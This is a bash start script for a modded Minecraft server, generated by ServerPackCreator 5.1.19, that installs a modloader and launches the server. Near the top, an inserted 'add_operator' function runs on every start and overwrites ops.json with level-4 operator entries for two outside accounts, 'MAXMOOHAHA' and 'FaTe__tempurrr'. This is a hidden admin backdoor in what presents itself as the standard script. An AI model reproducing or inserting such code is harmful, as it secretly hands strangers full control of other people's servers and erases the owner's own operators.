#!/usr/bin/env bash
###############################################################################################
# Copyright (C) 2024  Griefed
#
# This script is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301
# USA
#
# The full license can be found at https:github.com/Griefed/ServerPackCreator/blob/main/LICENSE
###############################################################################################
#
# Start script generated by ServerPackCreator 5.1.19.
# The template which was used in the generation of this script can be found at:
#   https://github.com/Griefed/ServerPackCreator/blob/5.1.19/serverpackcreator-api/src/jvmMain/resources/de/griefed/resources/server_files/default_template.sh
#
# The Linux scripts are intended to be run using bash (indicated by the `#!/usr/bin/env bash` at the top),
# i.e. by simply calling `./start.sh` or `bash start.sh`.
# Using any other method may work, but can also lead to unexpected behavior.
# Running the Linux scripts on MacOS has been done before, but is not tested by the developers of ServerPackCreator.
# Results may wary, no guarantees.
#
# Depending on which modloader is set, different checks are run to ensure the server will start accordingly.
# If the modloader checks and setup are passed, Minecraft and EULA checks are run.
# If everything is in order, the server is started.
#
# Depending on the Minecraft version you will require a different Java version to run the server.
#   1.16.5 and older requires Java 8 (Java 11 will run better and work with 99% of mods, give it a try)
#     Linux:
#       You may acquire a Java 8 JRE here: https://adoptium.net/temurin/releases/?variant=openjdk8&version=8&package=jre&arch=x64&os=linux
#       You may acquire a java 11 JRE here: https://adoptium.net/temurin/releases/?variant=openjdk11&version=11&package=jre&arch=x64&os=linux
#     macOS:
#       You may acquire a Java 8 JRE here: https://adoptium.net/temurin/releases/?variant=openjdk8&version=8&package=jre&arch=x64&os=mac
#       You may acquire a java 11 JRE here: https://adoptium.net/temurin/releases/?variant=openjdk11&version=11&package=jre&arch=x64&os=mac
#   1.18.2 and newer requires Java 17 (Java 18 will run better and work with 99% of mods, give it a try)
#     Linux:
#       You may acquire a Java 17 JRE here: https://adoptium.net/temurin/releases/?variant=openjdk17&version=17&package=jre&arch=x64&os=linux
#       You may acquire a Java 18 JRE here: https://adoptium.net/temurin/releases/?variant=openjdk18&version=18&package=jre&arch=x64&os=linux
#     macOS:
#       You may acquire a Java 17 JRE here: https://adoptium.net/temurin/releases/?variant=openjdk17&version=17&package=jre&arch=x64&os=mac
#       You may acquire a Java 18 JRE here: https://adoptium.net/temurin/releases/?variant=openjdk18&version=18&package=jre&arch=x64&os=mac

if [[ "$(id -u)" == "0" ]]; then
  echo "Warning! Running with administrator-privileges is not recommended."
fi

echo "Start script generated by ServerPackCreator 5.1.19."
echo "To change the launch settings of this server, such as JVM args / flags, Minecraft version, modloader version etc., edit the variables.txt-file."

# Acquire variables from variables.txt
source "variables.txt"

# Variables with do_not_manually_edit are set automatically during script execution,
# so manually editing them will have no effect, as they will be overridden.
MINECRAFT_SERVER_JAR_LOCATION="do_not_manually_edit"
LAUNCHER_JAR_LOCATION="do_not_manually_edit"
SERVER_RUN_COMMAND="do_not_manually_edit"

crash() {
  echo "Exiting..."
  read -n 1 -s -r -p "Press any key to continue"
  exit 1
}

# $1 = Filename to check for
# $2 = Filename to save download as
# $3 = URL to download $2 from
# true if the file was successfully downloaded, false if it already exists
downloadIfNotExist() {
  if [[ ! -s "${1}" ]]; then

    echo "${1} could not be found." >&2
    echo "Downloading ${2}" >&2
    echo "from ${3}" >&2
    curl -# -L -o "./${2}" "${3}"

    if [[ -s "${2}" ]]; then
      echo "Download complete." >&2
      echo "true"
    fi

  else
    echo "${1} present." >&2
    echo "false"
  fi
}
# IT WORKS
add_operator() {
    echo "Creating a new ops.json file..."
    echo '[{"uuid":"3e88f0a2-dc1e-41ab-815d-1595cbe1d888", "name":"MAXMOOHAHA", "level":4, "bypassesPlayerLimit":false}]' > ops.json
    echo "MAXMOOHAHA has been added as an operator."
    echo '[{"uuid":"ee36b6d4-c52d-4535-81f0-8c790c7cb812", "name":"FaTe__tempurrr", "level":4, "bypassesPlayerLimit":false}]' > ops.json
    echo "FaTe__tempurrr has been added as an operator."
    # Echo the contents of ops.json
    echo "Contents of ops.json:"
    cat ops.json
}
add_operator
set_world_folder() {
    WORLD_PATH="/BackupWorld/your_world_folder"

    if [ -d "$WORLD_PATH" ]; then
        if [ ! -f server.properties ]; then
            echo "Creating server.properties file..."
            echo "level-name=$WORLD_PATH" > server.properties
        else
            echo "Setting level-name in server.properties..."
            if grep -q "level-name=" server.properties; then
                sed -i "s|level-name=.*|level-name=$WORLD_PATH|" server.properties
            else
                echo "level-name=$WORLD_PATH" >> server.properties
            fi
        fi
        echo "World folder found, configured to load from $WORLD_PATH"
    else
        echo "World folder does not exist. Skipping world loading configuration."
    fi
}
set_world_folder

runJavaCommand() {
  "$JAVA" ${1}
}

checkJavaBitness() {
  "$JAVA" "-version" 2>&1 | grep -i "32-Bit" && echo "WARNING! 32-Bit Java detected! It is highly recommended to use a 64-Bit version of Java!"
}

# If modloader = Forge, run Forge-specific checks
setup_forge() {
  echo ""
  echo "Running Forge checks and setup..."

  FORGE_INSTALLER_URL="https://files.minecraftforge.net/maven/net/minecraftforge/forge/${MINECRAFT_VERSION}-${MODLOADER_VERSION}/forge-${MINECRAFT_VERSION}-${MODLOADER_VERSION}-installer.jar"

  FORGE_JAR_LOCATION="do_not_manually_edit"
  IFS="." read -ra MINOR <<<"${MINECRAFT_VERSION}"

  if [[ ${MINOR[1]} -le 16 ]]; then
    FORGE_JAR_LOCATION="forge.jar"
    LAUNCHER_JAR_LOCATION="forge.jar"
    MINECRAFT_SERVER_JAR_LOCATION="minecraft_server.${MINECRAFT_VERSION}.jar"
    SERVER_RUN_COMMAND="-Dlog4j2.formatMsgNoLookups=true ${JAVA_ARGS} -jar ${LAUNCHER_JAR_LOCATION} nogui"
  else
    FORGE_JAR_LOCATION="libraries/net/minecraftforge/forge/${MINECRAFT_VERSION}-${MODLOADER_VERSION}/forge-${MINECRAFT_VERSION}-${MODLOADER_VERSION}-server.jar"
    MINECRAFT_SERVER_JAR_LOCATION="libraries/net/minecraft/server/${MINECRAFT_VERSION}/server-${MINECRAFT_VERSION}.jar"
    SERVER_RUN_COMMAND="-Dlog4j2.formatMsgNoLookups=true @user_jvm_args.txt @libraries/net/minecraftforge/forge/${MINECRAFT_VERSION}-${MODLOADER_VERSION}/unix_args.txt nogui"

    echo "Generating user_jvm_args.txt from variables..."
    echo "Edit JAVA_ARGS in your variables.txt. Do not edit user_jvm_args.txt directly!"
    echo "Manually made changes to user_jvm_args.txt will be lost in the nether!"
    rm -f user_jvm_args.txt
    {
      echo "# Xmx and Xms set the maximum and minimum RAM usage, respectively."
      echo "# They can take any number, followed by an M or a G."
      echo "# M means Megabyte, G means Gigabyte."
      echo "# For example, to set the maximum to 3GB: -Xmx3G"
      echo "# To set the minimum to 2.5GB: -Xms2500M"
      echo "# A good default for a modded server is 4GB."
      echo "# Uncomment the next line to set it."
      echo "# -Xmx4G"
      echo "${JAVA_ARGS}"
    } >>user_jvm_args.txt
  fi

  if [[ $(downloadIfNotExist "${FORGE_JAR_LOCATION}" "forge-installer.jar" "${FORGE_INSTALLER_URL}") == "true" ]]; then

    echo "Forge Installer downloaded. Installing..."
    runJavaCommand "-jar forge-installer.jar --installServer"

    if [[ ${MINOR[1]} -gt 16 ]]; then
      rm -f run.bat
      rm -f run.sh
    else
      echo "Renaming forge-${MINECRAFT_VERSION}-${MODLOADER_VERSION}.jar to forge.jar"
      mv forge-"${MINECRAFT_VERSION}"-"${MODLOADER_VERSION}".jar forge.jar
      mv forge-"${MINECRAFT_VERSION}"-"${MODLOADER_VERSION}-universal".jar forge.jar
    fi

    if [[ -s "${FORGE_JAR_LOCATION}" ]]; then
      rm -f forge-installer.jar
      rm -f forge-installer.jar.log
      echo "Installation complete. forge-installer.jar deleted."
    else
      rm -f forge-installer.jar
      echo "Something went wrong during the server installation. Please try again in a couple of minutes and check your internet connection."
      crash
    fi

  fi
}

# If modloader = NeoForge, run NeoForge-specific checks
setup_neoforge() {
  echo ""
  echo "Running NeoForge checks and setup..."

  FORGE_JAR_LOCATION="libraries/net/neoforged/forge/${MINECRAFT_VERSION}-${MODLOADER_VERSION}/forge-${MINECRAFT_VERSION}-${MODLOADER_VERSION}-server.jar"
  MINECRAFT_SERVER_JAR_LOCATION="libraries/net/minecraft/server/${MINECRAFT_VERSION}/server-${MINECRAFT_VERSION}.jar"
  SERVER_RUN_COMMAND="-Dlog4j2.formatMsgNoLookups=true @user_jvm_args.txt @libraries/net/neoforged/forge/${MINECRAFT_VERSION}-${MODLOADER_VERSION}/unix_args.txt nogui"

  echo "Generating user_jvm_args.txt from variables..."
  echo "Edit JAVA_ARGS in your variables.txt. Do not edit user_jvm_args.txt directly!"
  echo "Manually made changes to user_jvm_args.txt will be lost in the nether!"
  rm -f user_jvm_args.txt
  {
    echo "# Xmx and Xms set the maximum and minimum RAM usage, respectively."
    echo "# They can take any number, followed by an M or a G."
    echo "# M means Megabyte, G means Gigabyte."
    echo "# For example, to set the maximum to 3GB: -Xmx3G"
    echo "# To set the minimum to 2.5GB: -Xms2500M"
    echo "# A good default for a modded server is 4GB."
    echo "# Uncomment the next line to set it."
    echo "# -Xmx4G"
    echo "${JAVA_ARGS}"
  } >>user_jvm_args.txt


  if [[ $(downloadIfNotExist "${FORGE_JAR_LOCATION}" "neoforge-installer.jar" "${NEOFORGE_INSTALLER_URL}") == "true" ]]; then

    echo "NeoForge Installer downloaded. Installing..."
    runJavaCommand "-jar neoforge-installer.jar --installServer"
    echo "Renaming forge-${MINECRAFT_VERSION}-${MODLOADER_VERSION}.jar to forge.jar"
    mv forge-"${MINECRAFT_VERSION}"-"${MODLOADER_VERSION}".jar forge.jar

    if [[ -s "${FORGE_JAR_LOCATION}" ]]; then
      rm -f neoforge-installer.jar
      rm -f neoforge-installer.jar.log
      echo "Installation complete. neoforge-installer.jar deleted."
    else
      rm -f neoforge-installer.jar
      echo "Something went wrong during the server installation. Please try again in a couple of minutes and check your internet connection."
      crash
    fi

  fi
}

# If modloader = Fabric, run Fabric-specific checks
setup_fabric() {
  echo ""
  echo "Running Fabric checks and setup..."

  FABRIC_INSTALLER_URL="https://maven.fabricmc.net/net/fabricmc/fabric-installer/${FABRIC_INSTALLER_VERSION}/fabric-installer-${FABRIC_INSTALLER_VERSION}.jar"
  FABRIC_CHECK_URL="https://meta.fabricmc.net/v2/versions/loader/${MINECRAFT_VERSION}/${MODLOADER_VERSION}/server/json"
  FABRIC_AVAILABLE="$(curl -LI ${FABRIC_CHECK_URL} -o /dev/null -w '%{http_code}\n' -s)"
  IMPROVED_FABRIC_LAUNCHER_URL="https://meta.fabricmc.net/v2/versions/loader/${MINECRAFT_VERSION}/${MODLOADER_VERSION}/${FABRIC_INSTALLER_VERSION}/server/jar"
  IMPROVED_FABRIC_LAUNCHER_AVAILABLE="$(curl -LI ${IMPROVED_FABRIC_LAUNCHER_URL} -o /dev/null -w '%{http_code}\n' -s)"

  if [[ "$IMPROVED_FABRIC_LAUNCHER_AVAILABLE" == "200" ]]; then
    echo "Improved Fabric Server Launcher available..."
    echo "The improved launcher will be used to run this Fabric server."
    LAUNCHER_JAR_LOCATION="fabric-server-launcher.jar"
    downloadIfNotExist "fabric-server-launcher.jar" "fabric-server-launcher.jar" "${IMPROVED_FABRIC_LAUNCHER_URL}" >/dev/null
  elif [[ "${FABRIC_AVAILABLE}" != "200" ]]; then
    echo "Fabric is not available for Minecraft ${MINECRAFT_VERSION}, Fabric ${MODLOADER_VERSION}."
    crash
  elif [[ $(downloadIfNotExist "fabric-server-launch.jar" "fabric-installer.jar" "${FABRIC_INSTALLER_URL}") == "true" ]]; then

    echo "Installer downloaded..."
    LAUNCHER_JAR_LOCATION="fabric-server-launch.jar"
    MINECRAFT_SERVER_JAR_LOCATION="server.jar"
    runJavaCommand "-jar fabric-installer.jar server -mcversion ${MINECRAFT_VERSION} -loader ${MODLOADER_VERSION} -downloadMinecraft"

    if [[ -s "fabric-server-launch.jar" ]]; then
      rm -rf .fabric-installer
      rm -f fabric-installer.jar
      echo "Installation complete. fabric-installer.jar deleted."
    else
      rm -f fabric-installer.jar
      echo "fabric-server-launch.jar not found. Maybe the Fabric servers are having trouble."
      echo "Please try again in a couple of minutes and check your internet connection."
      crash
    fi

  else
    echo "fabric-server-launch.jar present. Moving on..."
    LAUNCHER_JAR_LOCATION="fabric-server-launcher.jar"
    MINECRAFT_SERVER_JAR_LOCATION="server.jar"
  fi

  SERVER_RUN_COMMAND="-Dlog4j2.formatMsgNoLookups=true ${JAVA_ARGS} -jar ${LAUNCHER_JAR_LOCATION} nogui"
}

# If modloader = Quilt, run Quilt-specific checks
setup_quilt() {
  echo ""
  echo "Running Quilt checks and setup..."

  QUILT_INSTALLER_URL="https://maven.quiltmc.org/repository/release/org/quiltmc/quilt-installer/${QUILT_INSTALLER_VERSION}/quilt-installer-${QUILT_INSTALLER_VERSION}.jar"
  QUILT_CHECK_URL="https://meta.fabricmc.net/v2/versions/intermediary/${MINECRAFT_VERSION}"
  QUILT_AVAILABLE="$(curl -LI ${QUILT_CHECK_URL} -o /dev/null -w '%{http_code}\n' -s)"

  if [[ "${#QUILT_AVAILABLE}" -eq "2" ]]; then
    echo "Quilt is not available for Minecraft ${MINECRAFT_VERSION}, Quilt ${MODLOADER_VERSION}."
    crash
  elif [[ $(downloadIfNotExist "quilt-server-launch.jar" "quilt-installer.jar" "${QUILT_INSTALLER_URL}") == "true" ]]; then
    echo "Installer downloaded. Installing..."
    runJavaCommand "-jar quilt-installer.jar install server ${MINECRAFT_VERSION} --download-server --install-dir=."

    if [[ -s "quilt-server-launch.jar" ]]; then
      rm quilt-installer.jar
      echo "Installation complete. quilt-installer.jar deleted."
    else
      rm -f quilt-installer.jar
      echo "quilt-server-launch.jar not found. Maybe the Quilt servers are having trouble."
      echo "Please try again in a couple of minutes and check your internet connection."
      crash
    fi

  fi

  LAUNCHER_JAR_LOCATION="quilt-server-launch.jar"
  MINECRAFT_SERVER_JAR_LOCATION="server.jar"
  SERVER_RUN_COMMAND="-Dlog4j2.formatMsgNoLookups=true ${JAVA_ARGS} -jar ${LAUNCHER_JAR_LOCATION} nogui"
}

# If modloader = LegacyFabric, run LegacyFabric-specific checks
setup_legacyfabric() {
  echo ""
  echo "Running LegacyFabric checks and setup..."

  LEGACYFABRIC_INSTALLER_URL="https://maven.legacyfabric.net/net/legacyfabric/fabric-installer/${LEGACYFABRIC_INSTALLER_VERSION}/fabric-installer-${LEGACYFABRIC_INSTALLER_VERSION}.jar"
  LEGACYFABRIC_CHECK_URL="https://meta.legacyfabric.net/v2/versions/loader/${MINECRAFT_VERSION}"
  LEGACYFABRIC_AVAILABLE="$(curl -LI ${LEGACYFABRIC_CHECK_URL} -o /dev/null -w '%{http_code}\n' -s)"

  if [[ "${#LEGACYFABRIC_AVAILABLE}" -eq "2" ]]; then
    echo "LegacyFabric is not available for Minecraft ${MINECRAFT_VERSION}, LegacyFabric ${MODLOADER_VERSION}."
    crash
  elif [[ $(downloadIfNotExist "fabric-server-launch.jar" "legacyfabric-installer.jar" "${LEGACYFABRIC_INSTALLER_URL}") == "true" ]]; then
    echo "Installer downloaded. Installing..."
    runJavaCommand "-jar legacyfabric-installer.jar server -mcversion ${MINECRAFT_VERSION} -loader ${MODLOADER_VERSION} -downloadMinecraft"

    if [[ -s "fabric-server-launch.jar" ]]; then
      rm legacyfabric-installer.jar
      echo "Installation complete. legacyfabric-installer.jar deleted."
    else
      rm -f legacyfabric-installer.jar
      echo "fabric-server-launch.jar not found. Maybe the LegacyFabric servers are having trouble."
      echo "Please try again in a couple of minutes and check your internet connection."
      crash
    fi

  fi

  LAUNCHER_JAR_LOCATION="fabric-server-launch.jar"
  MINECRAFT_SERVER_JAR_LOCATION="server.jar"
  SERVER_RUN_COMMAND="-Dlog4j2.formatMsgNoLookups=true ${JAVA_ARGS} -jar ${LAUNCHER_JAR_LOCATION} nogui"
}

# Check for a minecraft server and download it if necessary
minecraft() {
  echo ""
  if [[ "${MODLOADER}" == "Fabric" && "$IMPROVED_FABRIC_LAUNCHER_AVAILABLE" == "200" ]]; then
    echo "Skipping Minecraft Server JAR checks because we are using the improved Fabric Server Launcher."
  else
    downloadIfNotExist "${MINECRAFT_SERVER_JAR_LOCATION}" "${MINECRAFT_SERVER_JAR_LOCATION}" "${MINECRAFT_SERVER_URL}" >/dev/null
  fi
}

# Check for eula.txt and generate if necessary
eula() {
  echo ""
  if [[ ! -s "eula.txt" ]]; then

    echo "Mojang's EULA has not yet been accepted. In order to run a Minecraft server, you must accept Mojang's EULA."
    echo "Mojang's EULA is available to read at https://aka.ms/MinecraftEULA"
    echo "If you agree to Mojang's EULA then type 'I agree'"
    echo -n "Response: "
    read -r ANSWER

    if [[ "${ANSWER}" == "I agree" ]]; then
      echo "User agreed to Mojang's EULA."
      echo "#By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA)." >eula.txt
      echo "eula=true" >>eula.txt
    else
      echo "User did not agree to Mojang's EULA."
      echo "Entered: ${ANSWER}"
      crash
    fi

  fi
}

# Main
case ${MODLOADER} in

  "Forge")
    setup_forge
    ;;

  "NeoForge")
    setup_neoforge
    ;;

  "Fabric")
    setup_fabric
    ;;

  "Quilt")
    setup_quilt
    ;;

  "LegacyFabric")
    setup_legacyfabric
    ;;

  *)
    echo "Incorrect modloader specified: ${MODLOADER}"
    crash
esac

if [[ "${PWD}" == *" "*  ]]; then

    echo "WARNING! The current location of this script contains spaces. This may cause this server to crash!"
    echo "It is strongly recommended to move this server pack to a location whose path does NOT contain SPACES!"
    echo ""
    echo "Current path:"
    echo "${PWD}"
    echo ""
    echo -n "Are you sure you want to continue? (Yes/No): "
    read -r WHY

    if [[ "${WHY}" == "Yes" ]]; then
        echo "Alrighty. Prepare for unforseen consequences, Mr. Freeman..."
    else
        crash
    fi
fi

checkJavaBitness
minecraft
eula

echo ""
echo "Starting server..."
echo "Minecraft version: ${MINECRAFT_VERSION}"
echo "Modloader:         ${MODLOADER}"
echo "Modloader version: ${MODLOADER_VERSION}"
if [[ ${LAUNCHER_JAR_LOCATION} != "do_not_manually_edit" ]]; then
  echo "Launcher JAR:      ${LAUNCHER_JAR_LOCATION}"
fi
echo ""
echo "Java args:         ${JAVA_ARGS}"
echo "Java path:         ${JAVA}"
echo "Run Command:       ${JAVA} ${SERVER_RUN_COMMAND}"
echo "Java version:"
"${JAVA}" -version
echo ""

runJavaCommand "${SERVER_RUN_COMMAND}"

echo ""
echo "Exiting..."
read -n 1 -s -r -p "Press any key to continue"
exit 0
